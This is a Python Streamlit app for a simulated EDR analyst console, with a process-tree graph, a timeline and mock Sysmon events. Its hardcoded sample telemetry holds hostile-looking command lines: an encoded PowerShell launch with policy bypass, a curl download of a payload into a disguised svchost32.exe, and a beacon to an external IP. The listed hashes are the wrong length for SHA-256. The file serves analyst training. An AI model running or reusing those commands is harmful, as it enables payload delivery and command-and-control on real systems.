import time
import streamlit as st
import pandas as pd
from streamlit_agraph import agraph, Node, Edge, Config


PROCESS_METADATA = {
    "explorer.exe:4280": {
        "type": "Process",
        "process_name": "explorer.exe",
        "pid": "4280",
        "ppid": "812",
        "user": "ACME\\jsmith",
        "command_line": "C:\\Windows\\explorer.exe",
        "sha256": "6a8f3e4a1c8892a0d6f2f1a9c1b733a61a3db842",
        "risk": "Low",
    },
    "cmd.exe:5664": {
        "type": "Process",
        "process_name": "cmd.exe",
        "pid": "5664",
        "ppid": "4280",
        "user": "ACME\\jsmith",
        "command_line": "cmd.exe /c whoami && ipconfig /all",
        "sha256": "d8e5771f3c9a4f1bb6e2a93fded142aac1d9e8af",
        "risk": "Medium",
        "mitre": "T1059 - Command and Scripting Interpreter",
    },
    "powershell.exe:6112": {
        "type": "Process",
        "process_name": "powershell.exe",
        "pid": "6112",
        "ppid": "5664",
        "user": "ACME\\jsmith",
        "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
        "sha256": "0f9c2e14a7b91c2f448c6ef22dbb33a7b71e40fa",
        "risk": "High",
        "mitre": "T1059.001 - PowerShell",
    },
    "curl.exe:7340": {
        "type": "Process",
        "process_name": "curl.exe",
        "pid": "7340",
        "ppid": "6112",
        "user": "ACME\\jsmith",
        "command_line": "curl.exe -k https://185.199.110.153/payload.bin -o C:\\Users\\Public\\svchost32.exe",
        "sha256": "9f2c41b6a3f3d2177e94db7d3e403a46cc43a0cb",
        "risk": "High",
        "mitre": "T1105 - Ingress Tool Transfer",
    },
    "svchost32.exe:8120": {
        "type": "Process",
        "process_name": "svchost32.exe",
        "pid": "8120",
        "ppid": "7340",
        "user": "ACME\\jsmith",
        "command_line": "C:\\Users\\Public\\svchost32.exe -connect 45.77.88.21:443",
        "sha256": "d41d8cd98f00b204e9800998ecf8427e",
        "risk": "Critical",
        "mitre": "T1055 - Process Injection",
    },
    "45.77.88.21": {
        "type": "Network Destination",
        "remote_ip": "45.77.88.21",
        "domain": "update-checkin-service.com",
        "port": "443",
        "protocol": "TCP",
        "risk": "Critical",
    },
    "185.199.110.153": {
        "type": "Network Destination",
        "remote_ip": "185.199.110.153",
        "domain": "raw.githubusercontent.com",
        "port": "443",
        "protocol": "TCP",
        "risk": "High",
    },
}


BASE_TIMELINE = [
    {"time": "09:14:03", "event_id": 1, "type": "Process Create", "process": "explorer.exe", "summary": "User shell started."},
    {"time": "09:15:22", "event_id": 1, "type": "Process Create", "process": "cmd.exe", "summary": "cmd.exe spawned from explorer.exe."},
    {"time": "09:15:45", "event_id": 1, "type": "Process Create", "process": "powershell.exe", "summary": "PowerShell launched with encoded command."},
    {"time": "09:16:11", "event_id": 3, "type": "Network Connection", "process": "curl.exe", "summary": "curl.exe connected to 185.199.110.153:443."},
    {"time": "09:16:40", "event_id": 11, "type": "File Create", "process": "svchost32.exe", "summary": "Suspicious binary written to C:\\Users\\Public."},
    {"time": "09:17:08", "event_id": 3, "type": "Network Connection", "process": "svchost32.exe", "summary": "Outbound beacon to 45.77.88.21:443."},
]


LIVE_SYSMON_EVENTS = [
    {"time": "09:18:01", "event_id": 1, "type": "Process Create", "process": "whoami.exe", "summary": "Discovery command executed by suspicious shell."},
    {"time": "09:18:17", "event_id": 3, "type": "Network Connection", "process": "svchost32.exe", "summary": "Additional outbound connection to 45.77.88.21:443."},
    {"time": "09:18:44", "event_id": 11, "type": "File Create", "process": "svchost32.exe", "summary": "Dropped persistence artifact in Startup folder."},
]


def initialize_state():
    defaults = {
        "authenticated": False,
        "analyst_role": "Tier 1",
        "selected_node": None,
        "case_status": "New",
        "sysmon_stream_paused": False,
        "timeline_events": BASE_TIMELINE.copy(),
        "intel_verdicts": {},
    }

    for key, value in defaults.items():
        if key not in st.session_state:
            st.session_state[key] = value


def login_screen():
    st.set_page_config(page_title="EDR Triage Console", page_icon="🛡️", layout="wide")

    st.title("🛡️ EDR Analyst Console")
    st.caption("Simulated authentication wrapper")

    with st.form("login_form"):
        role = st.selectbox(
            "Select Analyst Role",
            ["Tier 1", "Tier 2", "Threat Hunter"],
        )

        submitted = st.form_submit_button("Enter Console")

        if submitted:
            st.session_state.authenticated = True
            st.session_state.analyst_role = role
            st.rerun()


def build_graph():
    nodes = [
        Node(id="explorer.exe:4280", label="explorer.exe\nPID 4280", size=28, color="#10b981", shape="box"),
        Node(id="cmd.exe:5664", label="cmd.exe\nPID 5664", size=30, color="#f59e0b", shape="box"),
        Node(id="powershell.exe:6112", label="powershell.exe\nPID 6112", size=35, color="#f97316", shape="box"),
        Node(id="curl.exe:7340", label="curl.exe\nPID 7340", size=34, color="#f97316", shape="box"),
        Node(id="svchost32.exe:8120", label="svchost32.exe\nPID 8120", size=40, color="#ef4444", shape="box"),
        Node(id="185.199.110.153", label="185.199.110.153\n443", size=32, color="#8b5cf6", shape="dot"),
        Node(id="45.77.88.21", label="45.77.88.21\n443", size=38, color="#dc2626", shape="dot"),
    ]

    edges = [
        Edge(source="explorer.exe:4280", target="cmd.exe:5664", label="spawned"),
        Edge(source="cmd.exe:5664", target="powershell.exe:6112", label="spawned"),
        Edge(source="powershell.exe:6112", target="curl.exe:7340", label="spawned"),
        Edge(source="curl.exe:7340", target="svchost32.exe:8120", label="dropped"),
        Edge(source="curl.exe:7340", target="185.199.110.153", label="TCP 443"),
        Edge(source="svchost32.exe:8120", target="45.77.88.21", label="TCP 443"),
    ]

    config = Config(
        width="100%",
        height=520,
        directed=True,
        physics=True,
        hierarchical=True,
        nodeHighlightBehavior=True,
        highlightColor="#22d3ee",
        collapsible=False,
    )

    return nodes, edges, config


def render_case_bar():
    c1, c2, c3, c4 = st.columns([2, 2, 2, 2])

    with c1:
        st.session_state.case_status = st.selectbox(
            "Case Status",
            ["New", "In Progress", "Closed"],
            index=["New", "In Progress", "Closed"].index(st.session_state.case_status),
        )

    with c2:
        st.metric("Analyst Role", st.session_state.analyst_role)

    with c3:
        if st.button("Threat Intel Enrichment"):
            selected = st.session_state.selected_node
            if selected:
                verdict = "Malicious" if selected in ["45.77.88.21", "svchost32.exe:8120"] else "Clean"
                st.session_state.intel_verdicts[selected] = verdict

    with c4:
        if st.button("Logout"):
            st.session_state.authenticated = False
            st.rerun()


def render_investigation_drawer():
    st.subheader("Investigation Drawer")

    selected = st.session_state.selected_node

    if not selected:
        st.info("Click a process or network node to inspect telemetry.")
        return

    metadata = PROCESS_METADATA.get(selected, {})

    verdict = st.session_state.intel_verdicts.get(selected)
    if verdict == "Malicious":
        st.error("Threat Intel Verdict: Malicious")
    elif verdict == "Clean":
        st.success("Threat Intel Verdict: Clean")

    st.write(f"**Selected Node:** `{selected}`")

    for key, value in metadata.items():
        if value in [None, "", []]:
            continue

        label = key.replace("_", " ").title()

        if key in ["command_line", "sha256", "file_path", "remote_ip"]:
            st.write(f"**{label}:**")
            st.code(str(value))
        else:
            st.write(f"**{label}:** `{value}`")


def render_timeline():
    st.subheader("Chronological Storyline Timeline")

    df = pd.DataFrame(st.session_state.timeline_events)
    st.dataframe(df, use_container_width=True, hide_index=True)


def render_sysmon_stream():
    with st.expander("📡 Live Sysmon Collector Simulation", expanded=True):
        pause_label = "Resume Stream" if st.session_state.sysmon_stream_paused else "Pause Stream"

        if st.button(pause_label):
            st.session_state.sysmon_stream_paused = not st.session_state.sysmon_stream_paused
            st.rerun()

        if st.session_state.sysmon_stream_paused:
            st.warning("Sysmon stream paused.")
        else:
            st.success("Sysmon stream active.")

        for event in LIVE_SYSMON_EVENTS:
            c1, c2 = st.columns([5, 1])

            with c1:
                st.write(
                    f"**{event['time']} | Event ID {event['event_id']} | {event['type']}**"
                )
                st.caption(event["summary"])

            with c2:
                if st.button("Ingest", key=f"ingest_{event['time']}_{event['event_id']}"):
                    st.session_state.timeline_events.append(event)
                    st.success("Event ingested.")


def render_dashboard():
    st.title("🛡️ Interactive EDR Triage Dashboard")
    st.caption("Streamlit + streamlit-agraph | Analyst-first investigation workflow")

    render_case_bar()
    st.divider()

    left, right = st.columns([3, 1])

    with left:
        st.subheader("Interactive Process Tree & Network Graph")

        nodes, edges, config = build_graph()
        clicked_node = agraph(nodes=nodes, edges=edges, config=config)

        if clicked_node:
            st.session_state.selected_node = clicked_node

        render_timeline()
        render_sysmon_stream()

    with right:
        render_investigation_drawer()


def main():
    initialize_state()

    if not st.session_state.authenticated:
        login_screen()
        return

    render_dashboard()


main()